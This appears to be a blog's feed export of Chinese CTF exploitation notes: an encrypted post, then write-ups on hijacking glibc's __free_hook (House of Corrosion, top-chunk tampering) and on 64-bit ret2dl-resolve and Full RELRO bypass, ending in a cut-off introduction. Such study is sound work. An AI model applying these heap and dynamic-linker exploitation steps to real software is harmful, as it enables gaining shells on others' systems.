76d69b10d3ec8c869454b96be039f55fd3ccf8a9fa1bae7ea6c088542125434dbf4d14640eb7e2dd353e7742f77c378d46308d8820d69261218d13e2fa816756258b7472cfe5a08ba11b577a94603e397d8d5f212acbf30d0af87472beb3304280634f9a64042ba9483da951c3cb8757e67e25e6389c07ab42d4f969b302a22ae9b3bd3dbbb2d28ac8bda0bbddfb16a35863dfde18f0848c8235e7392a1abd4d2fd3d30b9219a1836fd3b63a1a639f1c4e5a697650589af103a6c3c92ec6a9136116cf41e3d67e50b6c33bdc2bd4923b33c13aea1013751c856771cb3f927747902e4d1a2587439ad2b8de3f1a909c3e8e4a82a38638eaba1a33284cb000bfeaf49de791f3c42c250239a370302aacfb39cc52884aeadd585c184a64c592a2b9b2c912c1f4976007a92d3d8962b4e8cb677e5a00ebcacae639c634dff1722b79066c2f69c8b2a3ba4053b532a298cb373e9e5a4c3d389231800933af764a3acdfe566a3733e155921e15a04d4e09f717d7ca2da2a4cbb6b3129713da70b39f630c05596b9f5e5aa3377368210bfc88ea2d2056dbcd9a22aeba9c34b7b6a497cbfc68482256c388d76e9c497a0889598417c2b5a60941b61901c63c84a7c3b3e387a4719a6a7de7bf4bba1bb433b0a16eaa735206a87ae404451997f9234a8d5d91c1f92d2064199775d6ccddd273ae373eb20829516f909153e4dc757914b206ac3a7e12c0760f5170dd479cc4934be4b38cf99bab4aa565ff725a0b7647aa66fa348bcf538234c9ea23e54b4ba9bed2f53b8bbbe556617c41a48420936c4cf4af37e9578b2939c8ddb6e67af74d8504115ea1fe24ea674aacf938dfd681b3c3828e4b5fe207df6c3cd4b5af4f8c2dc8da1295acf9cbbe0b9b786510d23436a4ddfe3a078f30810abbac1f9f11ae0d21a03ad63268ed16c4c7595f251dbef3e639c66ef08fc97f6587248428b8b0ac7009b4b510f89327402ef4c74312e92e192f90f62741352f05db9debb8e841038ff26a7bd48e6d16013b4b4ba793a22f8783d22a781ddc0c9593b6d1dfa611437153f5cb4d2a86b12036c33fc5e6978c469b7222fe116d29244836ebe89226edb9ab0ab95c385723a7dfabddb5c4972d3417b1e8b7b4e40cdde88b20ebac8860990ceb9619ea6dc0a6ca8ef6b2b0f456f03bb9beea88e4492213cbe2f9d7d402a91d7174fcc8961e502ee8bc98d52666987d58f9c8353020028f5252bb7b8d8f9bd2149ff179255e7388e15c09fdbf0db03316a87e2af1ca0c66a2d794f793da0216fca8e4ccb8b7f04a4f0deb080a60c684781853b59e05e2937f079625d063ace69168b4fd11f7faf0db1ebb962c93404e6ba4cefe4ae5bf4d7c816b5c076bbd47e8bec9488d3b53fbd6970d8a6bdad6139bc3b8fe86e7a7d93d6544fb5ce491e83325875ae7e219a0fc8e5e80aa81b126539a6a2785039c7aa200f1ef5e1db084b508d6c36d83c9752875054f48c74e90c06d1f4cdf13b37b8cfd6dec36a4c5997f2d389d9f11c08be66ee44f1a3b5d752ad0d9a20954e00641f92f43b1187fae22a2cfa236aa3a2c760496f527e2ef4e2cd4c7bf5482212b4b3b93921453dd66a95aa6cf6c729f90509af4458025578cb88ce2b79c19ddf467490bb017592c3ea7efeac241fc71221b89cea010d3f9cc68b31a26f0c574e64f228a6309908e3e7ba91e30eeb35bf5adbcb3949af082bd0ac4323992d83968bc403b604fb5f799729533d907f7c92d2751e68586f7624f105495245c219f4386b60f42947ef9913b87753963a296a36a6cb8b8da851384dba635aaaf2d509768d897575b31ef47f66929b3c5aa575f7e663d43d052cec08cdec9e97f44a9960d9938d4d569a981223d2ee9b0f2582768043ca0479453b34e17e62e6c2731ea8501c96600c5c280b9e626ee1948b945b0ca6ade61724c9c668b83bb1df0fe449cf7086a4a740800d771316a9d50f18e96df6f944de57845ac745706c164c82c64aef2171ba0a4862026ab3dad82fc2b7fd1f13738cca383823a0d24ffefc31d4a9e501a9082ba2f563a6225d6fb1b3a8d187580eaedc25d5150f357054a47361c363b7400d6f8d73723532d3a41fde172b93e2bb78789f4e310bc21eb526318dcf881733a4508f03660130d4ce7bab400e3cfcf64ef69ad315716dd0ef5f4fe256aa32323d33312d528239ab9cba3848e503fe503473f6af59d2e103e5e445b679e2b791fff5038227a5a659ddf42e3addb0058a3575b67e6840b213ae8571bb6b42b0c413fffd27311995b4a02fdcda0fe410ca192c935fd27debe9d5bc9647b886b411300a8d559ac53ee69b24a8428a3d744db367f2a231ce335dff6704e17ec57efdcb9cbd4a3ec47a4be2e04e3722b224f4701ae51e62de6588936b714a3edf0fa2e91d71bd81ab4236f1cd32143f0885cb84b324e6ae6eee5aba510bb2b2a522ffcf19059a599308588f29a183302d1fe032fa5f9d114c911aaf909780e23c11d9394dc7118bad46c8976068d8dfc0f19af53d61d7ab2fa7de2e35935d1c9a74f5f18e9448b957dc3103dc2a9a93118530fa25ac5afcc3656b4d5fd30957ef0fdee37112cb6ed620d03898bd0741571e8e53c73948ad731c37e8e8cd6dc3451ef97c29b582c168cd34b670252b2ed38edeb935ec45c94d230c9c7a4c94ae2540ccd8ed04452aaa76bd01abb3526bafd92d5fcbe20b112130c08a490d0a5f8729783bce681727c90d1e85456f2868113381d9dbfae7b2da8c734a1359209acecc205c1ad8ebe48aa8e6f02e2cc23c67d9e38dc929a4d94d9b2454625850828c97d3e156855de58e7e7d6fc4fedc775948903a36666069a0ba6a79dc2dc3d289ee2453aa29edb547c0005c4f11cbefb324c0ad396a4b2b571c3aa1b904ebfa85d24e02973b7eb2ed48a2be1ea4888279713eff7151cc5369783babdb102c7864e35badf0d3387b11c1ebf2b318136a1baf4f91d7b5385e354cc522925f1b6301213ecebb5adb6cf05aac852af4d5e48ddbe33daa81c86c58be5b42e8a4a5bf21e6990f840fa6da44a10280b22367dc867d675c055729440bafce7c1afda6a29bffed8bb643cf75cae26b8eb2b1b79b9d541b6bcae5378e1ee1ae1c9e13dd0ffac6312ec95ee6f932711a43aab469422bd14dd78ba059719f5fe257e76de12480e6ac0c7ad40233f48facb9d0d22468df6c9e8ad0fcf621018c6ad9f5a7eb64e61a4acffe36175ef34bdf46a77bc51154e15ecee546394a32ea952c7b65a3c920f8862d0cfe531be2d128be6aa40ea68939fdde7bf3a1902ddce9fa12019b5bedc4b2fc7c9806e823fa83496ffd2386728b1b3cebf424491835a83c2d11496d1ff112992ad829f755ede5a603c58b542fc0a8c684c722b5e1f0ffbd20ccd5da5d30c72c6290c466b8a870b20a204f8520a6df55a4aed4a870fcff767db20a58fb757ab37ee96636160c3d03c108c23fb3458677565187e0593afcc1b48b2a8b5fac69bac6f62ce749bc8e17840b1d7299024e5cd6269b8d3201375ef8133c3fbf62964a9e63b8a0512cfb7d882b42db2ccb4e2c8f99b2e5be0e2993e603673f41b67323c40f89f1bb72d7aa0689e1e8e84e7c2dd00ce02b017850b48de00785d5352e9af9d4fcab15c18e5e3d0778fb472219a9ea3ab2a8ca2df204fde0580d2ee8c2ae0e849ae0cf47dfcfd3c2427562e4930362bb82249a0c0650e15eb50e302680cb2239745bc22864a2f54540cda1e9958720033470e5ddb73778ec773271fa6b1e0d40a302dc2a13acbf91af157a0160fe2b5b74bcb41eb5173fb683eb4194366ac2e88b739a83de10c2f3ef2639bc5be5e5f7de2873511b657a2b1d555c923c28fbdb96f0d3fcaf4b3c15317b6abd5d2bf0f9c09a6c49e73e9a47abbb731fd44ce19482d7fa0190c66e36037eb47779b4f1a2645d81808711f815c70a3611aae5798ecc5b627e74085d582b5969fb2211e3676d9e9be3ccf2ec70220a6b29007a2d68cff03c7c45f35166f95f1377abe74530e4c968333cd67340c93dfcbecf320ff3078279c2d4c554972cee2d275df845eaf9b3751af93547c9980566386427c91389ca9101dd3ba3dd2f54f5aaae2a43d27727964f67b51e454aa2f1f54ff9bb52b6243dc2d6bc448b0f67a902273e64a3cbbc534a523b6e20c3d88a97801732fca4a044feca5895521d1411a029e58f863a77d7315e8e02673c08d8db62e959cea101c1ee5adf445d02e0d5ce3e62db80aa08c85c6cbfbcf07739e93ee74834e92b158ddf3ed09f2aa2d3126188646c626c38f2a344b01806b01bed97a490b250a4252475f0b53e8b5eaccedefb5063dddabb7422d965213b498d56994516665986b4b3d7ca67b0764d375ac75918056cae28c03d89d7bd282e2fdf26c7f27d5b15c3e29df8f0866351929c3164eb2e765a6646d1e1e0c53e8bcd7985364927aeed15e50e76611c14c832f8a98bc0f885587bdb60919a238991674e4f7de147cc6560bb795be7a977eade597e1edd5f39c549cdce8f22d67d04967d48f38763c841e6892d74c055505d0da681088da7c3d90c47ca5db7dd3351ff4ba06f6b9a4fd0071a72531932f4cbde339b9043c12d94719d8fa82a6c85cf4ac74884afb0296d6e677f20a78bde795aea4e03f2b2dff881f6578f777a22433306b7d91b7ffd8a8b23a18f50190e075564c145d36646a9571868b9cfa83f0d5aad9e147fe882d7393cbb4b1b71f7069f10dcc3da27dbce2b27624bc8939f6e9890d627962560f887e32acff82629e1be9430b6277ac4624ee127385c6078943ddc2e12299464db89d93186f519551c06fe39cf2940c51ca601df2fef8b94fad242e6aa6396314606fef5877ae71e58e67a6104eeaf8a7e8367fc261f51f9f908b5ac4d6890913da440b9aab03caa5a9b703e30160f013b9611942b8f9a264b427168d3b53c0624c29452f814ad01cb0f93efd33ba44e7f2755dae19f5feb22d48d8a6d115c0ed10568f6941c02248cd2d3249d9416c1a6fd44d870f8f290a19de24af08f4c7209c305cff027d82175337c77ed969a1555f6dc02e2f6570a189b4bc50125be4d17ac3178aee1a51c7d3c212c35a4ae8c7a640a1b4cb1a08996072ff959ed8145e6081dd47a44a3869e6517d2a560ba5b495d8204cd5d845f0b5cfb6a54d81bd9c9de5daa51e9a1568407b33bebaa35dffc6f5957950ebc80b9017b8b795621eb46962c80a92a88c94f2f9492be78d2109435519a372384f721dfa172bcffa4d3c600075fc85769908f70eddc251db65c85d3aac9e88dcd6e887800e8aebaa067ae9ceeba5777c012215ce3e2338d3b9731b00ebbd26746ae1e35e3d4f2da09330aa5f18fd9b7d80aa1fb37da7170feec761d1d63f2efd3cf3baa57d3befbb5f4c8264a3e23513ba7b619c01c1433865f07fd74c71c7ae420d779687031e2be3fef3076ae05dbdbaf7957653d7d8c73a7dd608257fa2fc7940937da6ac64a0162d44baa068bfe92c530506d1235fb9da9e765e39584661c8f08f4eeb98a882d0bde9d57dd26ccbfb434cb988772cf98ee66a1a8ef902789bea5a0fd12f2232495206ec40333f62a845760694418ba504cf95abd462185ea2603f88088b17419d800090dfcaf5a42024d28bfb334d6615a2e982f18fa46b838d4206ffaf11c7dd91d69305b0ecd50f5eb7259a666df6fb8bca251ed25cf140ff7ba0db412dd63d34a691f5ee7036bc34f1d2668805bc0a40ca61fe4f4ff13db6042b13008367c715f0d8832fa04a18f2bde60002ae40a66ef9725fb7bd0a237ac8aed7cee14b697387f4f714045eed49bc8cd91abf15df8ebb4b52edef506226ca621d3f0745c5f17fffe0c626f30ae1b2224b21d572fd509a0a7f317485dbce454f6cfcf735cd26101f8f9030ab045ce20a00146be1a3ea5a7bb6b8ba28d6493050e25c2e42e3f1adf772750caf559ff7b270cd79d4c6a4b86cc727f1f7382905d583cb9e618a24adb6ba5354eddda07c30d8cd245d408e9f70067e36e6928afe68d34b2b6d0a6655a247556ccd3f44db6512e0b19a6e7e72ed9b6761a9eee38225c4f4920806c9d710da483a9ec5de4c60991686b907e3fda584b2178a44f392f97f89d977ae28cb6284d3ac8376409ee89d4af1872aa763d50b470122970db5a868e492020eb810c70eb2c625d767c200278d1b44783c182a54f9118c373914d61d9a4826a2d13b0e014813b40c880d2912373a44e16edbec48afc4a9265fc993ead99d515cd8deb3405b20e421a4495e09efd82803b0a607ea0179967d29e56a54926f14adebf82098881c255a4b305892f68d02f14569a31e7c610ceea35ee73348540233ebee33c1be3e001c8412d64c084a273eff1abf3e50c24556b8ca21bce5544cce29bd8161a79141b5e2ddab886932b6a0f026c7c3005668d3ad6844ff96358f784b95b699a13e43eda228ac3ffc8858efd513c1292eb0de7f364fba0b63eda9fa9adf73762ba9a677053b219633fff054c674d8b0c9c442ddc6a7cfc2920571e9c1b8082b1c65e30357a07dfd8dbca7c473d209b7c5eacfdbab282a8ba46a62daf0ac74c480bf1c818d0985b9aa96a969c203ebfdf283d05260003df7b4c494994d1964c6c43ce1336af159c9b251b2367f023e4bc4acabd341249f5f4729c4f800ca67f66045ee5d93b7453228cb4370ce00a9a4331cfaad0db05c6c27eb169f0ec7aae6410b26abd3307b8b9487879eafce085232b6ba9323bb381d84dac090959b85c0a24e44c4922e358b11977674420b4dee19c6c80f9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">私人领地</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>free_hook劫持(glibc2.26之前)</title>
      <link href="/2022/11/22/free-hook-jie-chi-glibc2.26-zhi-qian/"/>
      <url>/2022/11/22/free-hook-jie-chi-glibc2.26-zhi-qian/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做Full RELRO的堆题远程环境one_gadget总是无效,于是便来研究一下__free_hook劫持,加入tcache之后的__free_hook劫持比较容易，本文主要探讨glibc2.26之前的利用方法<br>要有其他方法(或是让one_gadget生效的方法)欢迎qq交流</p><h1 id="free-hook劫持原理"><a href="#free-hook劫持原理" class="headerlink" title="free_hook劫持原理"></a>free_hook劫持原理</h1><p>在调用free函数时，若__free_hook的值存在，便会先调用__free_hook指向的地址，于是可以将__free_hook的值改为system函数的地址，再free一个指向”/bin/sh\x00”的指针，便可达到system(“/bin/sh”)的效果</p><h1 id="free-hook劫持方法"><a href="#free-hook劫持方法" class="headerlink" title="free_hook劫持方法"></a>free_hook劫持方法</h1><p>不同于__malloc_hook和realloc_hook的劫持方法，由于free_hook上方一定区域内(<del>大概率?</del>)不存在能制造字节错位的条件(<del>有的话也超出了Fastbin的范围</del>)，于是直接通过<code>Fastbin Arbitrary Alloc</code>到__free_hook上方的方法基本失效<br>ps:补充一点,gdb.attach上去可以看到free_hook低地址处正好有个7f开头的地址，不过这个地址是__isoc99_scanf函数写上去的，函数执行完后便清零了(<del>血泪教训</del>)</p><h3 id="1-篡改top域"><a href="#1-篡改top域" class="headerlink" title="1.篡改top域"></a>1.篡改top域</h3><p>通过改写main_arena，篡改top域并将top chunk转移到__free_hook之前，便可通过分配chunk劫持__free_hook</p><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol><li>前提是得能分配很大的chunk(分配很多次也行),因为实际上能伪造为top chunk的size域的地址离free__hook很远(glibc2.23这一偏移为0xb58)</li><li>攻击main_arena的top域也并非易事,malloc_hook-0x23(glibc2.23)处的字节错位得到的fake_chunk并不足以让你覆盖到top域(<del>有堆溢出就当我没说</del>)<br>  倒也有解决办法，虽然覆盖不了top域但可以覆盖fastbinsY数组,修改然后获得一个能覆盖到top域的chunk<br>(理论上是可行的，但实际过程遇到了很多高手情况,以后再回来复现吧…)</li></ol><h3 id="2-House-of-Corrosion"><a href="#2-House-of-Corrosion" class="headerlink" title="2.House of Corrosion"></a>2.House of Corrosion</h3><p>篡改global_max_fast为一个较大值(<code>Unsortedbin Attack</code>),然后计算__free_hook到FastbinY的偏移,再计算要伪造的bin的size</p><pre class=" language-python"><code class="language-python">fastbin_ptr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main_arena'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">8</span>idx<span class="token operator">=</span><span class="token punctuation">(</span>target_addr<span class="token operator">-</span>fastbin_ptr<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span>size<span class="token operator">=</span>idx<span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x20</span></code></pre><p>size计算简化之后是这样的</p><pre class=" language-python"><code class="language-python">chunk_size <span class="token operator">=</span> <span class="token punctuation">(</span>delta <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x20</span> ，delta为目标地址与fastbinY的offset</code></pre><p>然后free掉对应size的chunk，更改其的fd指针为目标值(在这里就是system函数地址)，再将A分配回来便完成劫持<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202211221629378.png"></p><h3 id="3-制造字节错位"><a href="#3-制造字节错位" class="headerlink" title="3.制造字节错位"></a>3.制造字节错位</h3><p>不方便利用不就是因为没有字节错位吗？制造一个就好了<code>Unsortedbin Attack</code>在__free_hook上方写入unsortedbin地址(0x7f开头)，然后正常<code>Fastbin Arbitrary Alloc</code>劫持</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://aidaip.github.io/binary/2020/02/20/House-of-Corrosion.html">AiDai  House of Corrosion</a><br><a href="https://zhuanlan.zhihu.com/p/448880453">House of Corrosion 原理及利用</a><br><a href="https://ray-cp.github.io/archivers/heap_global_max_fast_exploit">堆中global_max_fast相关利用</a><br><a href="https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/">malloc_hook以及free_hook劫持原理</a><br><a href="https://lexsd6.github.io/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/">劫持hook函数</a></p>]]></content>
      
      
      <categories>
          
          <category> 探究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl-resolve(2)：64位利用及Full RELRO</title>
      <link href="/2022/11/18/ret2dl-resolve-2-64-wei-li-yong-ji-full-relro/"/>
      <url>/2022/11/18/ret2dl-resolve-2-64-wei-li-yong-ji-full-relro/</url>
      
        <content type="html"><![CDATA[<h1 id="64位ret2dl-resolve"><a href="#64位ret2dl-resolve" class="headerlink" title="64位ret2dl-resolve"></a>64位ret2dl-resolve</h1><h2 id="32位与64位差别"><a href="#32位与64位差别" class="headerlink" title="32位与64位差别"></a>32位与64位差别</h2><ol><li>相关结构体大小不同</li><li><code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code>的参数reloc_arg在32位是地址偏移reloc_offset,在64位是reloc_index，含义是所重定位符号的重定位项在重定位表“.rel.plt”中的下标。重定位项地址reloc = JMPREL + reloc_index*3*8。</li><li>在这里直接引用<a href="https://sp4n9x.github.io/">Sp4n9x</a>师傅的一段话(<del>具体为啥会有问题我暂时也没理解到</del>)</li></ol><ul><li>64位情况下，bss节一般位于0x600000之后，重定位表“.rela.plt一般在0x400000左右，所以我们构造的r_info的高位(sym_index)和reloc_arg一般会很大。又因为计算符号项地址&amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]和符号版本项地址vernum[ELFW(R_SYM) (reloc-&gt;r_info)]时，数组的数据类型的大小不同(symtab中的结构体大小为0x18字节，vernum的数据类型为uint16_t，大小为0x2字节)，这就导致vernum[ELFW(R_SYM) (reloc-&gt;r_info)]大概率会访问到0x400000到0x600000之间的不可读区域(64位下，这个区间一般不可读)，使得程序报错。</li></ul><pre class=" language-c"><code class="language-c">      <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>        <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>      version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>所以我们要想办法进行绕过：(不绕过也是有很小几率成功的)</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="方案一：使l-gt-l-info-VERSYMIDX-DT-VERSYM-x3D-x3D-NULL"><a href="#方案一：使l-gt-l-info-VERSYMIDX-DT-VERSYM-x3D-x3D-NULL" class="headerlink" title="方案一：使l->l_info[VERSYMIDX (DT_VERSYM)] == NULL"></a>方案一：使l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == NULL</h3><p>l-&gt;l_info[VERSYMIDX (DT_VERSYM)] 的地址在64位是link_map+0x1c8,32位为link_map+0xe4<br>我们需要先泄露link_map地址，再将link_map+0x1c8设置成不为0。<br>之后就是和32位下的思路一样了，根据64位下的结构体伪造结构体，伪造reloc_arg来进行攻击。</p><h3 id="方案二：使sym-gt-st-other-x3D-x3D-0"><a href="#方案二：使sym-gt-st-other-x3D-x3D-0" class="headerlink" title="方案二：使sym->st_other== 0"></a>方案二：使sym-&gt;st_other== 0</h3><p>这应该是最普遍的做法吧<br>既然是绕过，干脆绕个大的，直接不进入最外层的判断</p><pre class=" language-c"><code class="language-c">  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></code></pre><p>程序会把该函数判定为已解析过的函数，进入else语句中<br>else语句相当于将l-&gt;l_addr + sym-&gt;st_value的值存在value中,作为函数的真实地址</p><pre class=" language-c"><code class="language-c">  <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* We already found the symbol.  The module (and therefore its load     address) is also known.  */</span>      value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l<span class="token operator">-></span>l_addr <span class="token operator">+</span> sym<span class="token operator">-></span>st_value<span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> l<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-c"><code class="language-c">DL_FIXUP_VALUE_TYPE value<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//DL_FIXUP_VALUE_TYPE是fixup/profile_fixup返回值的类型。保存函数的真实地址。</span></code></pre><pre class=" language-c"><code class="language-c">    lookup_t result<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//查找函数的结果，其为定义函数的共享对象的加载基地址</span></code></pre><p>我们可以选择把 sym-&gt;st_value 伪造为某个已解析函数的got表地址,如read.got ，再把 l-&gt;l_addr 改为 目标地址如 system 到 read 的偏移。那么我们的 value 最后就是 system地址。<br>要实现以上利用，我们需要伪造位于link_map+0x70的DT_SYMTAB指针、link_map+0xf8的DT_JMPREL指针、link_map+0x68的DT_STRTAB指针。之后就是伪造.dynamic中的DT_SYMTAB结构体和DT_JMPREL结构体以及函数所对应的Elf64_Rela结构体。为了方便，我在构造的过程中一般将reloc_index作为0来进行构造。<br>总的来说要满足以下条件(回忆一下延迟绑定的过程便很好理解)</p><ul><li>1.link_map中的DT_STRTAB、DT_SYMTAB、DT_JMPREL可读  </li><li>2.DT_SYMTAB结构体中的d_ptr即sym，(*(sym+5))&amp;0x03 != 0  </li><li>3.(reloc-&gt;r_info)&amp;0xff == 7  </li><li>4.rel_addr = l-&gt;addr + reloc-&gt;r_offset即原先需要修改的got表地址有可写权限  </li><li>5.l-&gt;l_addr + sym-&gt;st_value 为system的地址</li></ul><h1 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><code>Full RELRO</code>：继承<code>Partial RELRO</code>的所有保护，并且.got.plt被标为只读。此时延迟绑定技术被禁止，所有的外部函数地址将在程序装载时解析、装入，并标记为只读，不可更改。此时不需要link_map以及dl_runtime_resolve函数，则GOT表中这两项数据均置为0.</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><code>.dynamic</code>段中的以<code>DT_DEBUG</code>符号为关键字的值，指向了一个叫做<code>r_debug</code>结构体,其中的<code>r_map</code>字段即我们需要的<code>link_map</code>的地址<br>而至于<code>dl_runtime_resolve</code>函数，则可以从别的已加载进程序内存的且没有开<code>FULL RELRO</code>保护的<code>elf</code>(libc.so)的<code>GOT</code>中寻找.<br>link_map结构体内存在<code>l_next</code>和<code>l_prev</code>两个结构体指针可以让我们遍历到所有已加载进来的<code>elf</code>文件的<code>link_map</code>,再通过读取link_map中的<code>l_info[DT_PLTGOT]</code>是否为0来判断是否开启Full RELRO保护</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>感谢师傅们的文章<br><a href="https://bbs.pediy.com/thread-253833.htm#msg_header_h2_2">dl_runtime_resolve结合源码分析及常见的几种攻击手法</a><br><a href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">ret2_dl_runtime_resolve详解</a><br><a href="https://www.cnblogs.com/pwnfeifei/p/15701859.html">ret2dl_resolve</a><br><a href="https://ray-cp.github.io/archivers/ret2dl_resolve_analysis#64%E4%BD%8Delf%E7%A8%8B%E5%BA%8F%E7%9A%84ret2dl_resolve">ret2dl_resolve解析</a><br><a href="https://www.cnblogs.com/winmt/articles/15692475.html">ret2dlresolve 与 改写got表</a><br><a href="https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO/#%E4%B8%80.-ret2dlresolve%E5%8E%9F%E7%90%86">Ret2dlresolve攻击——从No RELRO到FULL RELRO</a></p>]]></content>
      
      
      <categories>
          
          <category> Stack Overflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl-resolve(1)：原理及基础利用</title>
      <link href="/2022/11/14/ret2dl-resolve-1-yuan-li-ji-32-wei-ji-chu-li-yong/"/>
      <url>/2022/11/14/ret2dl-resolve-1-yuan-li-ji-32-wei-ji-chu-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>ret2dl-resolve于2015年在论文_How the ELF Ruined Christmas_中被提出，作者是来自加州大学圣塔芭芭拉分校的Alessandro Di Federico等人。随着安全防御机制的不断完善，如今一个现代的漏洞利用通常包含两个阶段：</p><ol><li>通过信息泄露获得程序的内存布局</li><li>实际的漏洞利用</li></ol><p>然而，从程序中获得内存布局的方法并不总是可行的，且获得的被破坏的内存有时并不可靠。于是作者提出来ret2dl-resolve，巧妙地利用了ELF格式以及动态装载器的弱点，不需要进行信息泄露就可以直接标识关键函数的位置并调用。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>如果之前没有理解动态链接的过程和相应的段、节等前置知识，理解ret2dl-resolve是有些困难的，在这里放下我学习时的资料：<br>完整动态链接过程：<a href="https://zhuanlan.zhihu.com/p/134105591">深入窥探动态链接</a>    <a href="https://www.jianshu.com/p/8dd91ec35dda">动态链接</a><br>相关的一些节、段的介绍：<a href="https://www.thinbug.com/q/53156275">https://www.thinbug.com/q/53156275</a><br>源码：<a href="https://man7.org/linux/man-pages/man5/elf.5.html">相关段、节源码</a></p><h1 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h1><p>动态链接比静态链接要灵活得多，但它是以牺牲一部分性能为代价的。为优化动态链接性能，ELF采用了一种 <strong><code>延迟绑定(Lazy Binding)</code></strong> 的做法。基本思想就是当函数第一次被用到时才进行绑定(符号查找、重定位等)<br>具体流程引用一位师傅的图片<img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A.png"><br>用通俗一点(<del>不太准确</del>)的话描述一下过程(<del>我的理解</del>): 